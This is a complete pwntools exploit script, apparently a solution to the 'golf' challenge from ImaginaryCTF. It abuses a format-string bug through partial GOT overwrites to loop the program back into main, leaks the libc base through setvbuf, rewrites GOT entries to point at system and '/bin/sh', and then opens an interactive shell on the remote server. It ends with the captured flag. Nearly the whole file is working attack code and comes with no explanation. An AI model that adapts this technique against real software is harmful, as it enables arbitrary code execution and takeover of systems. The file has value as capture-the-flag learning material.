from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
context.log_level = "debug"

# libc6_2.31-0ubuntu9.9_amd64

elf = ELF("./golf")
libc = ELF("./libc6_2.31-0ubuntu9.9_amd64.so")
# io = gdb.debug('./golf', 'b *(main+93)\nc')
# io = gdb.debug('./golf', 'b *(main+103)\nc')
# io = process('./golf')
io = remote("golf.chal.imaginaryctf.org", 1337)
io.recvuntil(b"== proof-of-work: disabled ==\n")

# partial overwrite exit@got to main (0x40121b)
fmt = b"%*9$c%8$hn"
assert len(fmt) <= 10
fmt = fmt.ljust(16, b"\x00")
io.send(fmt + p64(elf.got["exit"]) + p64(0x121B) + b"\n")
io.recvn(0x121B)

# leak libc
fmt = b"%8$s"
assert len(fmt) <= 10
fmt = fmt.ljust(16, b"\x00")
io.send(fmt + p64(elf.got["setvbuf"]) + b"\n")
setvbuf = int.from_bytes(io.recvn(6), "little")
print(f"{setvbuf = :#x}")
libc_base = setvbuf - libc.sym["setvbuf"]
print(f"{libc_base = :#x}")
libc.address = libc_base


def write(addr, val):
    for i in range(4):
        if not val:
            continue
        fmt = b"%*9$c%8$hn"
        assert len(fmt) <= 10
        fmt = fmt.ljust(16, b"\x00")
        io.send(fmt + p64(addr + i * 2) + p64(val & 0xFFFF) + b"\n")
        io.recvn(val & 0xFFFF)
        val >>= 16


write(elf.got["setvbuf"], libc.sym["system"])
write(elf.got["stderr"], next(libc.search(b"/bin/sh\0")))

# # partial overwrite exit@got to _ (0x4011b6)
fmt = b"%*9$c%8$hn"
assert len(fmt) <= 10
fmt = fmt.ljust(16, b"\x00")
io.send(fmt + p64(elf.got["exit"]) + p64(0x11B6) + b"\n")
io.recvn(0x11B6)

io.interactive()
# ictf{useless_f0rmat_string_quirks_f0r_days_9b5d191f}
